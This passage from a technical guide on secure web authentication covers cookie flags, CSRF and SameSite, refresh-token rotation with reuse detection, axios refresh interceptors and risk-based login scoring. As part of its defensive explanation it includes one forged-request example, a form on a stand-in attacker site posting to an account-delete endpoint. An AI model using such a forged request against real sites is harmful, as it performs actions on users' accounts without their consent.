Never set the cookie's lifetime **longer** than the token's. OWASP's JWT guidance puts it plainly: set the cookie's `Max-Age` to a value equal to or less than the JWT's expiry time, never more.[^owasp-jwt] A cookie that outlives its token is a guaranteed 401 sitting in the user's browser waiting to happen.

### One more header: `Cache-Control: no-store`

Set this on any response that issues or carries a session token:

```javascript
res.setHeader( 'Cache-Control', 'no-store' )
```

OWASP's Session Management Cheat Sheet is blunt that session identifiers must never be cached, and recommends exactly this directive.[^owasp-session] The reason is easy to miss. Your `Set-Cookie` response can be cached, by an intermediate proxy, a CDN, or the browser's own disk cache. A cached login response is a token sitting on disk, or worse, a token a shared proxy might hand to the next person who asks for the same URL.

The cookie flags protect the token in the browser. `no-store` protects it everywhere between you and the browser. Both, not either.

### sameSite, and why it stops CSRF

Cookies have a property that is both their best and worst feature: **the browser sends them automatically**, on every request to the origin, whether or not your code asked.

Automatic is what lets you skip token juggling in JavaScript. Automatic is also CSRF. If `evil.example` contains:

```html
<form action="https://api.example.com/account/delete" method="POST">
```

the browser attaches your cookies to that request. It is a real, authenticated request that the user never intended.

`sameSite: 'strict'` tells the browser to withhold the cookie on any request originating from another site. The forged request arrives with no cookie and fails.

- **`strict`** is the safest. Side effect: following a link from an external site into your app arrives logged out, because even the top-level navigation drops the cookie. Users notice this.
- **`lax`** sends the cookie on top-level GET navigations only.[^mdn-samesite] The link works; the forged POST still fails. This is a reasonable default for most apps.
- **`none`** disables the protection entirely and requires `secure: true`. Only for genuine cross-site needs, and then you need CSRF tokens.

Start at `strict`. Downgrade to `lax` when a real user complains about a real link. Never `none` without knowing exactly why.

### Path-scoping the refresh cookie

This is the highest value-to-effort trick in this entire document, and almost nobody does it.

```javascript
CookieTypeEnum.REFRESH_TOKEN = new CookieTypeEnum( 'REFRESH_TOKEN', 'refreshToken', CookieTokenType.JWT, '/api/open/refresh' )
CookieTypeEnum.ACCESS_TOKEN  = new CookieTypeEnum( 'ACCESS_TOKEN',  'accessToken',  CookieTokenType.JWT, '/' )
```

The access token is scoped to `/`, so it goes out on every API call. It has to; every request needs it.

The refresh token is scoped to `/api/open/refresh`. **The browser will not send it anywhere else.** It is not in your dashboard request. Not in your search request. Not in a request that gets logged by an intermediate proxy. It appears on the wire only during the few seconds per session when it is actually being used.

Think about what that buys you. Your most valuable, longest-lived credential has a network exposure approaching zero. A leaky proxy log, a misconfigured APM tool, a chatty error tracker: none of them ever see it, because the browser never sends it to them.

Two cookies, two paths, one line of config, and the blast radius of an entire category of leak collapses.

![flowchart diagram 2|622](flowchart-2.svg)

### The client side is almost nothing

Because the browser handles all of it, the client code is one flag:

```typescript
export const secureAxiosInstance = axios.create( {
    baseURL: '/api/secure',
    timeout: 10000,
    withCredentials: true  // send cookies with requests
} )
```

`withCredentials: true` and you are done. One honest nuance: on a **same-origin** path like `/api` the browser attaches cookies whether or not this flag is set; `withCredentials` only changes cross-origin behavior, where the server must also send `Access-Control-Allow-Credentials`.[^mdn-withcredentials] Set it on the instance anyway, so nothing silently breaks the day the API moves to its own domain.

No `Authorization` header. No reading a token. No refresh timer. **No token-handling code in your frontend at all**, which means no token-handling bugs in your frontend.

Compare that to the localStorage approach: read token, check expiry, attach header, handle missing, handle expired, clear on logout, sync across tabs. All of it code you write, and all of it code you can get wrong. The cookie approach deletes the entire category.

> Set `withCredentials` **on the instance**, not per call. Set it per call and you will miss one, and that request will silently be unauthenticated.

---

## 5. Refresh Tokens

### Why two tokens

Recap: the access token cannot be revoked, so it must be short-lived. But a 5-minute session would be unusable.

The refresh token resolves this. It lives longer, is used rarely, and its **whole job is to mint new access tokens**. Because it is used rarely, at exactly one endpoint, you can afford to do an expensive check on every single use. That check is what makes it revocable.

| Token | Lifetime | Usage | Verification | Revocation |
|---|---|---|---|---|
| Access | Short | Used constantly | Math only | Cannot revoke |
| Refresh | Longer | Used rarely | Against a store | **CAN** revoke |

You are buying revocability with a database lookup, and you can afford it because it happens once per five minutes instead of once per request.

### Choosing TTLs

| Token | Typical | Why |
|---|---|---|
| Access | 5 to 15 min | Damage window for a stolen token you cannot revoke |
| Refresh | hours to days | Damage window for a stolen token you *can* revoke |

Shorter access token means smaller theft window but more refresh traffic. 5 to 15 minutes is the sweet spot almost everyone lands on.

The refresh TTL is a product decision, not a security one: it is literally "how long before we make the user log in again". A banking app might use 30 minutes. A consumer app might use 30 days. Both can be correct.

**Configure both from the environment:**

```bash
AUTH_ACCESS_TOKEN_TTL_SECONDS=300
AUTH_REFRESH_TOKEN_TTL_SECONDS=86400
```

```javascript
const accessTokenTtl = parseInt( process.env.AUTH_ACCESS_TOKEN_TTL_SECONDS, 10 )
const refreshTokenTtl = parseInt( process.env.AUTH_REFRESH_TOKEN_TTL_SECONDS, 10 )

if ( !Number.isInteger( accessTokenTtl ) || accessTokenTtl <= 0 ) {
    throw new Error( 'AUTH_ACCESS_TOKEN_TTL_SECONDS must be a positive integer' )
}
if ( !Number.isInteger( refreshTokenTtl ) || refreshTokenTtl <= 0 ) {
    throw new Error( 'AUTH_REFRESH_TOKEN_TTL_SECONDS must be a positive integer' )
}
```

Validate at **boot**, not at first use. A malformed TTL should stop the process from starting, loudly, not silently produce a token with `exp: NaN` at 3am.

> **A warning worth more than it looks.** If you make TTLs configurable, make sure the config is actually *read* by the code that mints tokens. It is startlingly common for a codebase to validate `TOKEN_TTL` at boot, export it, document it in the README, and then mint tokens from a hardcoded constant somewhere else. Everything looks configured. Nothing is. The only way to know is to trace the value from `process.env` to the `exp` claim, and it is worth doing that trace once, deliberately, right now. Then write a test that asserts the minted `exp` matches the configured TTL, so it stays true.

### Sliding vs absolute windows

Two models, and you must pick on purpose:

- **Absolute.** The refresh token's `exp` is fixed at login. Refreshing does not extend it. After N hours you log in again, no matter how active you were. Predictable and safe. Users on long sessions get logged out mid-task.
- **Sliding.** Each refresh issues a *new* refresh token with a fresh `exp`. An active user stays logged in indefinitely. A user idle longer than the refresh TTL gets logged out. This is what most consumer apps do, and it requires rotation (next section).

**If you do not rotate, you get an absolute window whether you wanted one or not**, because the refresh token's `exp` never moves. Teams are frequently surprised by this: they configure a 48-hour refresh token, do not rotate, and cannot work out why users are dropped after exactly 48 hours regardless of activity. That is not a bug. That is what "no rotation" means.

### Binding a refresh token to a device

A refresh token is a bearer token: whoever holds it can use it. Binding weakens that by requiring the *holder* to also look like the original device.

Build a fingerprint from stable request properties and **salt it**:

```javascript
const crypto = require( 'crypto' )

function createDeviceFingerprint( req ) {
    const material = [
        req.headers[ 'user-agent' ] || '',
        req.headers[ 'accept-language' ] || '',
        req.clientIp || ''
    ].join( '|' )

    return crypto
        .createHmac( 'sha256', process.env.AUTH_DEVICE_FINGERPRINT_SALT )
        .update( material )
        .digest( 'hex' )
}
```

The salt matters. Without it, the fingerprint is a plain hash of public information: anyone can compute what your fingerprint *should* be for a given user-agent and IP. With a secret salt, they cannot.

**Be careful including IP.** Mobile users change IP constantly, moving between wifi and cellular. Bind to IP and you will log those users out several times a day and they will report it as "the app randomly signs me out". Consider using only the user-agent and language, or a coarser network signal like the /24 subnet or the ASN.

This is a **speed bump, not a wall**. Every input is attacker-controllable. Someone who stole your refresh token probably also has your user-agent string. It raises cost; it does not stop a determined attacker. Ship it, and do not believe it is doing more than it is.

### The JTI allowlist: how you revoke the unrevokable

Here is the trick that makes the whole design work.

Remember that refresh tokens carry a `jti`, a unique random id. When you issue one, write that `jti` to a fast store with a TTL matching the token:

```javascript
async function registerRefreshJti( cache, { sub, jti, exp }, fingerprint ) {
    const ttlSeconds = Math.max( 0, exp - Math.floor( Date.now() / 1000 ) )

    await cache.set(
        CacheKeys.REFRESH_TOKEN,
        jti,
        { sub, fingerprint, exp },
        { ttlSeconds }
    )
}
```

Now the refresh token is only valid if **both** the signature verifies **and** its `jti` is present in the store. You have converted an unrevokable signed token into a revokable one, because now there is a row you can delete.

Deleting the `jti` kills the token instantly. That is your logout, your "sign out everywhere", your "lock this account now".

**Await the write.** If you fire-and-forget it, a fast client can hit `/refresh` before the write lands, get a spurious 401, and be bounced to login. Worse, if the write fails silently you have issued a token that can never be used, and you will have no idea why users are randomly logged out.

Setting the store TTL from `exp - now` means expired entries evict themselves. No cleanup job. The store's own TTL machinery does the work.

### Validate, and fail closed

```javascript
async function validateRefreshJti( cache, { sub, jti, exp }, fingerprint ) {
    const result = await cache.get( CacheKeys.REFRESH_TOKEN, jti )

    if ( !result ) {
        return false
    }

    return result.sub === sub &&
        result.exp === exp &&
        result.fingerprint === fingerprint
}
```

**The most important line here is `if ( !result ) return false`.**

Think about what happens when your cache is down. You have two choices:

- **Fail open** (`return true` when the store is unreachable): refreshes keep working during an outage. You have also just disabled your entire revocation mechanism, silently, at the exact moment you are least likely to notice. Every revoked token works again. Every fingerprint check is skipped. Your security control has an off switch labelled "Redis restart".
- **Fail closed** (`return false`): during a cache outage, users must log in again. Annoying. Loud. Obviously wrong to everyone immediately, which means it gets fixed.

**Fail closed.** A security control that disables itself under load is not a security control; it is a control that works right up until the moment it matters. Attackers cause outages on purpose for exactly this reason.

If cache availability genuinely threatens your uptime, fix that with a replica or a fallback store. Do not fix it by turning off authentication.

> The general principle: **when a security check cannot run, the answer is no.** Not "yes". Not "probably". No. Apply this everywhere, not just here.

### Rotation and reuse detection

Everything so far still has a hole: a stolen refresh token works, from anywhere, until it expires. You would never know.

**Rotation** closes it. Every refresh burns the old token and issues a new one:

1. Client presents refresh token `A`.
2. Server validates `A`, **deletes** `A`'s jti, issues access token plus **new** refresh token `B`.
3. Client's next refresh presents `B`. And so on.

Each refresh token is now single-use. But rotation on its own is not the payoff. This is:

**Reuse detection.** If token `A` is presented *again*, after it was already used, something is wrong. There are only two possibilities:

- An attacker stole `A`, and you are seeing the replay.
- An attacker stole `A` and used it first, and now the **legitimate user** is replaying it.

You cannot tell which. **So you kill the entire family**: every refresh token descended from that login, `A` through `Z`, all of them. Both parties get logged out. The real user logs in again, mildly annoyed. The attacker is locked out completely.

This is the crucial insight: **rotation does not prevent theft. It makes theft detectable.** Without it, a stolen refresh token is a silent, indefinite compromise. With it, the thief's very first use guarantees a collision, which triggers a full revocation. You cannot use a stolen refresh token *without announcing it*.

None of this is a home-grown trick. RFC 9700 requires refresh tokens for public clients to be sender-constrained or rotated, and recommends revoking the whole family when a rotated token is presented again.[^rfc9700-refresh]

![state diagram 1|622](state-1.svg)

Implementation. Give every login a `family` id, and carry it through every descendant:

```javascript
async function rotateRefreshToken( cache, oldClaim, fingerprint ) {
    const stored = await cache.get( CacheKeys.REFRESH_TOKEN, oldClaim.jti )

    // Signature verified, but the jti is gone. Either already used, or revoked.
    // If we have seen this family before, this is a replay. Burn it all down.
    if ( !stored ) {
        await cache.deleteByFamily( CacheKeys.REFRESH_TOKEN, oldClaim.family )
        console.warn( {
            message: 'Refresh token reuse detected, revoking token family',
            service: 'auth',
            userId: oldClaim.sub,
            family: oldClaim.family
        } )
        return { error: UnAuthorizedError, result: null }
    }

    if ( stored.fingerprint !== fingerprint ) {
        return { error: UnAuthorizedError, result: null }
    }

    // Single use: burn the old one before issuing the new one.
    await cache.delete( CacheKeys.REFRESH_TOKEN, oldClaim.jti )

    const newClaim = generateRefreshJwtClaim( {
        id: oldClaim.sub,
        family: oldClaim.family     // same family, new token
    } )
    await registerRefreshJti( cache, newClaim, fingerprint )

    return { error: null, result: newClaim }
}
```

Rotation has a real cost: it is **racy**. Two concurrent refreshes mean one wins, one presents a burned token, and reuse detection logs everyone out. This is not hypothetical; it is the single most common rotation bug, and it is why Section 6 spends so much time on the single-flight pattern. **If you rotate, you must serialize refreshes on the client.** The two are a package deal.

A short grace period, accepting a burned token for a few seconds if the fingerprint matches, is a pragmatic mitigation for flaky networks. It trades a sliver of security for a lot of stability. Reasonable people ship both ways.

### Logout must revoke

```javascript
router.post( async function postSignOut( req, res ) {
    const { payload } = decodeRefreshJwtPayloadAndValidate( req.cookies.refreshToken )

    // 1. Kill it server-side. This is the part that matters.
    await cache.deleteByFamily( CacheKeys.REFRESH_TOKEN, payload.family )

    // 2. Then clear the cookies.
    return clearAllCookies( res )
        .status( 200 )
        .json( { message: 'Signed out successfully' } )
} )
```

**Clearing cookies is not logging out.** It is asking the browser, politely, to forget something. If anyone copied that token, out of a proxy log, off a shared machine, via an extension, it still works. They did not receive your `Set-Cookie`. They do not care about your `Set-Cookie`.

Logout is **step 1**. Deleting the family server-side is the only part with any teeth. Step 2 is housekeeping.

Same reasoning applies to: password change, email change, "sign out everywhere", account suspension, and any privilege downgrade. All of them should nuke the token family. A password change that leaves the attacker's session alive has not achieved anything, and yet this is one of the most common auth bugs in production, because it *feels* like changing the password fixed it.

The access token still survives for its TTL. That is unavoidable and it is exactly why the TTL is 5 minutes.

### Rate limit the refresh endpoint

`/api/open/refresh` is unauthenticated by definition; it takes a token and gives out a better one. That makes it a target: an attacker with a possibly-stolen token can hammer it, and an attacker with none can use it to probe.

It is tempting to skip rate limiting here, reasoning that it needs a valid token anyway and legitimate clients only call it every few minutes. Do not. Rate limit it like any other unauthenticated endpoint. A legitimate client refreshing every 5 minutes will never come close to a sane limit, so the limit costs you nothing and denies an attacker unlimited attempts.

Rate limit by fingerprint or IP, not by user id, because you do not reliably know the user until after you have validated the token.

And make the endpoint a **POST**. A refresh mutates server state: it burns one token and mints another. On top of that, `sameSite: 'lax'` sends cookies on top-level GET navigations, so a GET refresh URL is a state-changing request an attacker can trigger with a link. POST closes that door and matches the semantics.

### The complete picture

![sequence diagram 1|622](sequence-1.svg)

Step 18 is worth pausing on: **re-check the user on refresh.** Deactivated, deleted, suspended, password changed? Refresh is your one scheduled opportunity, every five minutes, to notice that the world changed. Use it. It is the closest thing to a revocation heartbeat you get for free.

---

## 6. The Client Side: Axios Interceptors

Access tokens expire every 5 minutes. Users must not notice. That is this section.

### What an interceptor actually is

An axios interceptor is a **function axios runs for you at a fixed point in the request lifecycle**.[^axios-interceptors] Nothing more exotic than that. You are not patching axios or subclassing anything; you are registering a callback in a list.

There are two, and they bracket the network call:

![flowchart diagram 3|622](flowchart-3.svg)

**Request interceptor** runs after your code calls `api.get()` but before the request leaves. It gets the config object and must return it. Use it to add headers, log, add a correlation id.

**Response interceptor** takes *two* functions:

```javascript
instance.interceptors.response.use(
    ( response ) => { /* runs on 2xx */ return response },
    ( error )    => { /* runs on everything else */ return Promise.reject( error ) }
)
```

The key insight, and the one that makes everything else work: **whatever you return becomes what the caller receives.**

- Return a value from the error handler → the caller's `.then()` fires. **You have converted a failure into a success.**
- Return `Promise.reject(x)` → the caller's `.catch()` fires with `x`.
- Return *a new axios call* → the caller waits on that instead, and receives its result.

That third one is the entire trick. When a request 401s, the error handler can refresh the token, re-issue the original request, and return that promise. The original caller's `await` never resolved during any of this; it just took a bit longer and then succeeded.

**The calling code never learns the token expired.** No token logic in your components. No expiry checks. No refresh timers. One interceptor, written once, and the other 200 API calls in your app are simply unaware that authentication exists.

That is the whole point of interceptors: they let you solve the problem **once**, in one place, invisibly.

### Two instances, not one

```typescript
const BASE_API_URL = '/api'

export const secureAxiosInstance = axios.create( {
    baseURL: `${BASE_API_URL}/secure`,
    timeout: 10000,
    withCredentials: true
} )

export const openAxiosInstance = axios.create( {
    baseURL: `${BASE_API_URL}/open`,
    timeout: 10000,
    withCredentials: true
} )
```

`secure` gets refresh-on-401. `open` does not.

This is not tidiness, it is **loop prevention**. If the instance that performs the refresh call also retried on 401, then a failed refresh would trigger a refresh, which would 401, which would trigger a refresh. Infinite recursion, and your first clue is the browser tab locking up.

Two instances make that structurally impossible. `refreshToken()` goes out over `openAxiosInstance`, which has no 401 handler, so it cannot recurse. The separation is the safety mechanism, not a naming convention.

### The naive version, and why it breaks

Here is what most tutorials show:

```typescript
// INCOMPLETE - see the problem below
secureAxiosInstance.interceptors.response.use(
    ( response ) => response.data,
    async ( error: AxiosError ) => {
        const originalRequest = error.config as ExtendedAxiosRequestConfig
        if ( error.response?.status === 401 && !originalRequest._retry ) {
            originalRequest._retry = true
            await refreshToken()
            return secureAxiosInstance( originalRequest )
        }
        return Promise.reject( error )
    }
)
```

This is correct for **one** request at a time. Real apps do not make one request at a time.

Picture a dashboard mounting. TanStack Query fires six queries in parallel. The access token expired two minutes ago while the user was reading. All six return 401 at once. All six interceptors run. **All six call `refreshToken()`.**

![flowchart diagram 4|622](flowchart-4.svg)

Six refresh calls where one would do is wasteful. That is the mild version.

The severe version: **with rotation enabled, this logs the user out.** Refresh #1 burns the token and gets a new one. Refreshes #2 through #6 are already in flight carrying the *old* token. The server sees a burned token replayed five times, concludes theft, and revokes the family. Your user is now staring at a login screen because they opened a dashboard.

And it is *intermittent*. It needs concurrent requests plus an expired token, so it never reproduces locally where you have one tab and a warm token. It shows up in production as "users report random logouts", and it is miserable to diagnose.

**Rotation and client-side refresh serialization are not two features. They are one feature.** Ship either alone and you have a bug.

### The fix: single-flight refresh

The concept: **if a refresh is already running, do not start another. Wait for the one in flight.**

You will find tutorials solving this with a `isRefreshing` boolean plus a `failedQueue` array plus a `processQueue` function, thirty-odd lines of subscriber bookkeeping. You do not need any of it. A promise is *already* a value that multiple callers can await. Just hold onto it:

```typescript
let refreshPromise: Promise<void> | null = null

/**
 * Ensures only one refresh is ever in flight.
 * Concurrent callers all await the same promise.
 */
function refreshOnce(): Promise<void> {
    if ( !refreshPromise ) {
        refreshPromise = refreshToken().finally( () => {
            refreshPromise = null
        } )
    }
    return refreshPromise
}
```

That is the whole mechanism. Six lines.

- First caller finds `refreshPromise` null, starts the refresh, stores the promise.
- Callers two through six find it non-null and get **the same promise back**. No second network call.
- All six await the same result. One succeeds, all six proceed.
- `.finally()` clears the slot so the *next* expiry starts fresh.

`.finally()` and not `.then()` matters: it must clear on failure too, or one failed refresh poisons the slot forever and every future refresh awaits a rejected promise. Silent, permanent, and it only happens after a network blip.

This is safe without a real mutex because JavaScript is single-threaded. The check-and-assign cannot be interrupted; there is no `await` between reading `refreshPromise` and writing it. The `async` keyword does not change that.

### The complete interceptor

```typescript
import axios, { AxiosError, InternalAxiosRequestConfig } from 'axios'
import { refreshToken } from '@/api/endpoints'
import { navigationEvents } from '@/events/navigationEvents'
import { queryClient } from '@/api/queryClient'

interface ExtendedAxiosRequestConfig extends InternalAxiosRequestConfig {
    _retry?: boolean;
}

let refreshPromise: Promise<void> | null = null

function refreshOnce(): Promise<void> {
    if ( !refreshPromise ) {
        refreshPromise = refreshToken().finally( () => {
            refreshPromise = null
        } )
    }
    return refreshPromise
}

secureAxiosInstance.interceptors.response.use(
    ( response ) => response,
    async ( error: AxiosError ) => {
        const originalRequest = error.config as ExtendedAxiosRequestConfig

        // No config means the request never formed. Nothing to retry.
        if ( !originalRequest ) {
            return Promise.reject( error )
        }

        // Optional chaining is required: a timeout or network failure
        // leaves error.response undefined.
        if ( error.response?.status !== 401 || originalRequest._retry ) {
            return Promise.reject( error )
        }

        // Mark BEFORE awaiting, so the retry cannot re-enter this branch.
        originalRequest._retry = true

        try {
            await refreshOnce()
            return secureAxiosInstance( originalRequest )
        } catch ( refreshError ) {
            onSessionExpired()
            return Promise.reject( refreshError )
        }
    }
)
```

Four details that each prevent a real bug:

**`error.response?.status`** and not `error.response.status`. On a timeout or a dropped connection there is no response object. Without the `?.`, your interceptor throws a `TypeError` while handling an error, and that TypeError replaces the real one. You lose the actual failure and get a confusing stack trace pointing at your interceptor. With a 10-second timeout, this fires the first time someone's wifi hiccups.

**`_retry` set before the `await`.** It marks the request as "already given its one chance". If the retried request 401s again, the token is genuinely not working and retrying forever will not help. This is your recursion guard.

**Return `response`, not `response.data`.** You will see `( response ) => response.data` in the wild, silently unwrapping the axios envelope so callers get the body directly. It is convenient and it is a trap: your TypeScript types now claim `Promise<AxiosResponse<T>>` while the runtime hands back `T`. Every caller needs a cast, `axios.isAxiosError()` stops working on those errors because they are no longer axios errors, and the lie propagates through your whole API layer. If you want it, do it in one typed wrapper at the endpoint boundary where it is visible, not invisibly inside an interceptor.

**Emit an event, do not `window.location.href = '/login'`.** A hard navigation reloads the entire SPA: bundle re-download, state gone, white flash. Emit an event and let the router handle it:

```typescript
function onSessionExpired() {
    queryClient.clear()   // do not leave the previous user's data in cache
    navigationEvents.emit( { route: '/login', replace: true } )
}
```

`queryClient.clear()` is easy to forget and it matters. Without it, the next user to log in on that browser briefly sees the previous user's cached dashboard data before the queries refetch. Clear the cache on *every* path out of a session: sign-out **and** expiry. It is common to remember one and not the other.

### The happy path, end to end

![sequence diagram 2|622](sequence-2.svg)

### Do not handle 403 the same way

401 and 403 are different and conflating them causes a nasty bug.

- **401 Unauthorized** actually means *unauthenticated*. "I do not know who you are." A refresh might fix it.
- **403 Forbidden** means *authenticated but not allowed*. "I know exactly who you are, and no." A refresh will **never** fix it.[^rfc9110]

Retrying a 403 after a refresh gets you a second 403. If you also treat that as a session problem, you bounce a perfectly valid user to the login screen for clicking a button they lack permission for. They log back in, click it again, and get thrown out again.

Only ever refresh on **401**. Let 403 propagate to the UI as "you do not have access to this".

---

## 7. Risk-Based Authentication

### The idea

Everything so far treats all requests identically. A user logging in from their usual laptop at lunchtime gets the same treatment as one logging in from a device nobody has seen, on an account locked after six failed attempts, dormant for a year.

That is obviously wrong in both directions. It is too strict for the first user and far too lax for the second.

**Risk-Based Authentication scores each attempt and demands more proof when the score is high.** Low risk, get on with it. High risk, prove it with a code sent to your phone.

The word that matters is **proportionate**. RBA is not a bouncer that says no. It is a system that asks for more identification when something looks off.

### Step-up, not block

This is the part beginners get backwards, so it is worth being blunt about.

**A high risk score is not an accusation. It is uncertainty.**

"New device, dormant account" describes a burglar. It also describes a real person who bought a laptop and has not logged in since last summer. You genuinely cannot tell them apart from the signals, and you never will be able to.

So do not try. **Do not block on high risk.** Blocking means confidently locking out real users based on a heuristic you know is unreliable. Instead, **step up**: ask for another factor. The real user reads the SMS and continues, mildly inconvenienced. The attacker cannot, and stops.

Step-up converts an unanswerable question ("is this the real user?") into an answerable one ("can you receive a code at the phone number this account registered two years ago?"). That second question has a definite answer, and it is one an attacker almost never passes.

![flowchart diagram 5|622](flowchart-5.svg)

Notice there is no "denied" box. Even the worst score is a door with a stricter lock, not a wall.

### Signals: what to actually measure

A signal is any observable that correlates with risk. Good ones are cheap, stable for real users, and hard for an attacker to control.

| Signal | Question | Cheap? | Attacker-controllable? |
|---|---|---|---|
| Device recognition | Have we seen this device before? | Yes | Partly |
| Account locked | Has this account been under attack? | Yes | No |
| Recent failed attempts | Is someone guessing right now? | Yes | No |
| Account dormancy | Has this account been idle for a year? | Yes | No |
| Geolocation | Is this from an unusual country? | Costs money | Via VPN |
| Impossible travel | London, then Tokyo, 10 minutes apart? | Needs geo | Hard |
| Velocity | 50 attempts in a minute? | Yes | No |
| Time of day | 4am for a 9-to-5 user? | Yes | No |

**Start with the cheap ones.** Device recognition, lockout, failed attempts, and dormancy need no third-party service and no extra infrastructure. They cover the common cases well. Geolocation needs a paid IP database and mostly tells you about VPNs. Add it when the cheap signals are tuned and you have evidence you need more.

The column that matters most is the last one. **Signals an attacker controls are weak signals.** They can spoof a user-agent. They cannot easily make your database say the account has been active for a year.

### Device recognition

The one signal doing the most work. "Have we seen this device before?" separates the boring 95% from everything worth attention.

Reuse the fingerprint from Section 5:

```javascript
const crypto = require( 'crypto' )

function createDeviceFingerprint( req ) {
    const material = [
        'v1',                                                             // scheme version
        ( req.headers[ 'user-agent' ] || '' ).trim().substring( 0, 512 ),
        ( req.headers[ 'accept-language' ] || '' ).trim().substring( 0, 128 ),
        req.clientIp || ''
    ].join( '|' )

    return crypto
        .createHmac( 'sha256', process.env.AUTH_DEVICE_FINGERPRINT_SALT )
        .update( material )
        .digest( 'hex' )
}
```

Three details:

**The `'v1'` prefix.** A version tag on the scheme. When you change the inputs later, and you will, bump it to `v2`. Old fingerprints no longer collide with new ones and you can migrate deliberately instead of silently mis-recognizing every device at once. Free to add now, painful to retrofit.

**The `substring` caps.** These headers are attacker-controlled and unbounded. Someone will send a 2MB user-agent. Cap the length.

**The salt is the HMAC key.** Without it, the fingerprint is a plain hash of public information and anyone can compute what a given user's fingerprint should be. With it, they cannot. This is the same construction as Section 5, with the version tag and length caps added.

> **Read this before you include IP.** IP makes the fingerprint stronger and much less stable. A phone moving from wifi to cellular changes IP and becomes a brand new device. Include IP and expect frequent step-up prompts for mobile users, which they will report as "it keeps texting me codes". Either drop IP, use a coarse form like the /24 subnet or ASN, or accept the friction knowingly. There is no free lunch here; pick your tradeoff and write down which one you picked.
>
> Browser auto-updates change the user-agent too, so fingerprints naturally decay over weeks regardless. Design for that, do not fight it.

### Storing device history

```javascript
const DeviceHistorySchema = new Schema( {
    deviceHash: {
        type: String,
        required: true,
        description: 'SHA256 hash of the device fingerprint'
    },
    lastSeen: {
        type: Date,
        default: Date.now,
        description: 'Timestamp when this device was last seen'
    }
}, {
    _id: false
} )
```

Store **only the hash**, never the raw components. The hash is enough to answer "seen before?" and it is not reversible into a user's IP and browser history. If your device table leaks, it should be worthless.

Cap the list. Ten is a reasonable number:

```javascript
const saveDeviceHistory = async ( userId, deviceHash ) => {
    if ( !userId || !deviceHash || typeof deviceHash !== 'string' ) {
        return []
    }

    const user = await User.findById( userId, { deviceHistory: 1 } ).exec()
    if ( !user ) {
        return []
    }

    // Remove any existing entry for this device, then re-add with a fresh lastSeen.
    let deviceHistory = ( user.deviceHistory || [] ).filter(
        ( device ) => device.deviceHash !== deviceHash,
    )
    deviceHistory.push( { deviceHash, lastSeen: new Date() } )

    // Most recent first, keep 10.
    deviceHistory.sort( ( a, b ) => b.lastSeen - a.lastSeen )
    deviceHistory = deviceHistory.slice( 0, 10 )

    await User.findOneAndUpdate( { _id: userId }, { $set: { deviceHistory } } ).exec()
    return deviceHistory
}
```

Uncapped, this array grows forever. Fingerprints decay as browsers update, so a daily user generates new entries steadily, and in a year you are loading a thousand-element array on every risk check. The cap makes it self-maintaining: ten devices, least-recently-seen evicted.

### Enroll on proof, and everywhere you have it

**A device gets enrolled only after the user proves who they are.**

Enroll on a *failed* or *unauthenticated* attempt and you have built the opposite of a security control: an attacker visits once to get their device recognized, then returns as a known device. **Enrollment must be a side effect of success, never of attempt.**

Enroll everywhere you get proof:

- Successful password login. Obviously.
- **Successful password reset completion.** Easy to miss, and the omission is self-punishing. The whole point of a reset is that the user is often on a new device. They complete a full step-up, prove themselves with an OTP, and if you do not enroll them, their *next* reset scores them as a new device all over again. They are permanently stuck in high-risk. Enroll on every successful proof of identity, not just the login route.

```javascript
// after a successful reset
await repository.updatePassword( userId, newPassword )
await saveDeviceHistory( userId, req.fingerprint )   // they just proved themselves. Enroll.
await cache.deleteByFamily( CacheKeys.REFRESH_TOKEN, family )  // and kill old sessions
```

### Classifying a device

```javascript
const TRUSTED_DEVICE_DAYS = 30

function classifyDevice( fingerprintHash, deviceHistory = [] ) {
    const safeDeviceHistory = Array.isArray( deviceHistory ) ? deviceHistory : []
    const deviceRecord = safeDeviceHistory.find( h => h.deviceHash === fingerprintHash )

    if ( !deviceRecord ) {
        return DeviceStatus.NEW
    }

    const lastSeen = deviceRecord.lastSeen ? new Date( deviceRecord.lastSeen ) : null
    if ( !lastSeen || isNaN( lastSeen.getTime() ) ) {
        return DeviceStatus.RECOGNIZED
    }

    const daysSinceLastSeen = ( Date.now() - lastSeen.getTime() ) / ( 1000 * 60 * 60 * 24 )
    return daysSinceLastSeen <= TRUSTED_DEVICE_DAYS
        ? DeviceStatus.TRUSTED
        : DeviceStatus.RECOGNIZED
}
```

![state diagram 2|622](state-2.svg)

Three tiers, not two, because "seen last week" and "seen 14 months ago" are genuinely different. Recency is itself a signal, and collapsing it to a boolean throws away information you already have.

`isNaN( lastSeen.getTime() )` is not paranoia. Dates arrive corrupt from bad migrations and hand-edited records. An `Invalid Date` propagates into `NaN` days, every comparison against `NaN` is false, and you silently fall through to the wrong branch. Guard it.

### Scoring: give each factor its own points

The pattern that makes this maintainable is attaching the points to the factor itself:

```javascript
const RiskFactor = Object.freeze( {
    NEW_DEVICE:          { name: 'NEW_DEVICE',          points: 30 },
    RECOGNIZED_DEVICE:   { name: 'RECOGNIZED_DEVICE',   points: 10 },
    SUSPICIOUS_DEVICE:   { name: 'SUSPICIOUS_DEVICE',   points: 50 },
    ACCOUNT_LOCKED:      { name: 'ACCOUNT_LOCKED',      points: 100 },
    FAILED_ATTEMPTS:     { name: 'FAILED_ATTEMPTS',     points: 25 },
    MODERATE_INACTIVITY: { name: 'MODERATE_INACTIVITY', points: 15 },
    EXTENDED_INACTIVITY: { name: 'EXTENDED_INACTIVITY', points: 25 },
} )
```

Why this beats scattering magic numbers through your logic:

- **Every weight is in one screen.** Tuning is editing this block. You never hunt for a stray `+25`.
- **Factors are named.** When you log why someone got stepped up, you log `['NEW_DEVICE', 'EXTENDED_INACTIVITY']`, not `55`. That is the difference between a support ticket you can answer and one you cannot.
- **The scoring code reads as intent.** `RiskFactor.NEW_DEVICE.points` versus `30`.

### One assessor per signal

Each signal gets a function returning **both** a score and the factors that produced it:

```javascript
function assessDeviceRisk( deviceStatus ) {
    switch ( deviceStatus ) {
    case DeviceStatus.SUSPICIOUS:
        return { riskScore: RiskFactor.SUSPICIOUS_DEVICE.points, factors: [RiskFactor.SUSPICIOUS_DEVICE] }
    case DeviceStatus.NEW:
        return { riskScore: RiskFactor.NEW_DEVICE.points, factors: [RiskFactor.NEW_DEVICE] }
    case DeviceStatus.RECOGNIZED:
        return { riskScore: RiskFactor.RECOGNIZED_DEVICE.points, factors: [RiskFactor.RECOGNIZED_DEVICE] }
    case DeviceStatus.TRUSTED:
        return { riskScore: 0, factors: [] }
    default:
        return { riskScore: RiskFactor.NEW_DEVICE.points, factors: [RiskFactor.NEW_DEVICE] }
    }
}

function assessLockedAccount( user ) {
    if ( user?.locked ) {
